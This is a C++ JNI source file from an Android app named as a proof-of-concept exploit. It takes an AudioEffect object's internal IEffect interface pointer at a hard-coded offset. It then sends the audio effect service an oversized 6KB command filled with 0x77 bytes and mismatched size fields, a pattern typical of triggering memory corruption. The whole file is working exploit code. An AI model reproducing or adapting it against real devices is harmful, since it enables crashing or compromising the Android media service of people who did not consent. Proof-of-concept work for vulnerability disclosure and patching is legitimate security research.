#include <jni.h>
#include <stdint.h>

class IEffect {
public:
    virtual void a1() =  0;
    virtual void a2() =  0;
    virtual void a3() =  0;
    virtual void a4() =  0;
    virtual void a5() =  0;
    virtual void a6() =  0;
    virtual int command(uint32_t cmdCode, uint32_t cmdSize, void *cmd, uint32_t *replaySize, void *reply) = 0;

};

void writeLE(char *arr, int i, int num){
    arr[i] = (char)(num & 0xff);
    arr[i + 1] = (char)(num >> 8 & 0xff);
    arr[i + 2] = (char)(num >> 16 & 0xff);
    arr[i + 3] = (char)(num >> 24 & 0xff);
}

char rightBuf[] = {
    0x00, 0x00, 0x00, 0x00,
    0x08, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00
};

extern "C" jint Java_com_poc_exploit_MyActivity_exploit(JNIEnv* env, jclass thiz, jlong ptr)
{
    void *AudioEffectPtr = (void *)ptr;
    void *mIEffect = (void *)(*(uintptr_t *)(AudioEffectPtr + 212));
    int i = 0;
    char cmdData[12 + 1024*6];
    for (int i = 0; i < 12; ++i)
    {
        cmdData[i] = 0;
    }
    writeLE(cmdData, 4, 1024*6 / 2);
    writeLE(cmdData, 8, 1024*6 / 2);
    for (int i = 12; i < 12 + 1024*6; ++i)
    {
        cmdData[i] = 0x77;
    }
    char replyData[32] = {0};
    uint32_t replySize = 32;
    for (int i = 0; i < 32; ++i)
    {
        replyData[i] = cmdData[i];
    }

    IEffect *obj = reinterpret_cast<IEffect*>(mIEffect);
    jint ret = obj->command(8, 12+1024*6, cmdData, &replySize, replyData);

    return ret;
}